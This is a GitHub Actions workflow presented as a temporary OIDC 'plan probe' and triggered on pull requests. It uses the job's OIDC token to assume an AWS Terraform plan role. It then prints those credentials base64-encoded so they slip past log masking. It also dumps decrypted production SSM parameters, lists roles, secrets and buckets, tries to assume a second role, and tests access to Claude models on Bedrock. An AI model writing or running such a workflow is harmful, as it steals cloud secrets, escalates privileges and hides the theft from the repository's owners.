name: tmp-i50877-oidc-plan-probe
on:
  pull_request:
  workflow_dispatch: {}
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: id token claims
        run: |
          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "TOKENLEN=${#TOKEN}"
          echo "$TOKEN" > /tmp/idt
          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null || true
          echo
      - name: assume plan role (manual)
        run: |
          TOKEN=$(cat /tmp/idt)
          aws sts assume-role-with-web-identity --role-arn arn:aws:iam::896586841071:role/rebar-terraform-plan --role-session-name tmp-i50877 --web-identity-token "$TOKEN" --duration-seconds 3600 --output json > /tmp/creds.json 2>/tmp/creds.err || cat /tmp/creds.err
          head -c 300 /tmp/creds.json || true
          python3 - <<'PY'
          import json,os
          try:
              d=json.load(open('/tmp/creds.json'))['Credentials']
              open('/tmp/env.sh','w').write('export AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s\n'%(d['AccessKeyId'],d['SecretAccessKey'],d['SessionToken']))
          except Exception as e: print('no creds',e)
          PY
      - name: identity and secrets dump
        if: always()
        run: |
          source /tmp/env.sh 2>/dev/null || true
          export AWS_DEFAULT_REGION=us-east-1
          echo "== caller =="; aws sts get-caller-identity --output json || true
          echo "== envcreds b64 =="; env | grep '^AWS_' | base64 -w0; echo
          echo "== ssm /rebar/prod =="
          aws ssm get-parameters-by-path --path /rebar/prod --recursive --with-decryption --region us-east-1 --output json 2>&1 | head -c 20000
          echo
          echo "== ssm root =="
          aws ssm get-parameters-by-path --path / --recursive --with-decryption --region us-east-1 --output json 2>&1 | head -c 4000
          echo
          echo "== list-roles =="
          aws iam list-roles --query 'Roles[].RoleName' --output text 2>&1 | head -c 3000
          echo
          echo "== secretsmanager =="
          aws secretsmanager list-secrets --region us-east-1 --query 'SecretList[].Name' --output text 2>&1 | head -c 2000
          echo
          echo "== s3 =="
          aws s3api list-buckets --query 'Buckets[].Name' --output text 2>&1 | head -c 2000
          echo
          echo "== try external-ci-bedrock assume =="
          aws sts assume-role --role-arn arn:aws:iam::896586841071:role/rebar-external-ci-bedrock --role-session-name tmp-i50877 2>&1 | head -c 600
          echo
          echo "== bedrock models =="
          aws bedrock list-foundation-models --region us-east-1 --query 'modelSummaries[?contains(modelId,`claude-opus-5`)].modelId' --output text 2>&1 | head -c 1000
          echo
          for R in us-east-1 us-west-2; do
            for M in anthropic.claude-opus-5-5-v1:0 anthropic.claude-opus-5-5 us.anthropic.claude-opus-5-5-v1:0; do
              echo "== converse $R $M =="
              aws bedrock-runtime converse --region $R --model-id "$M" --messages '[{"role":"user","content":[{"text":"say ok"}]}]' --inference-config '{"maxTokens":8}' 2>&1 | head -c 500; echo
            done
          done
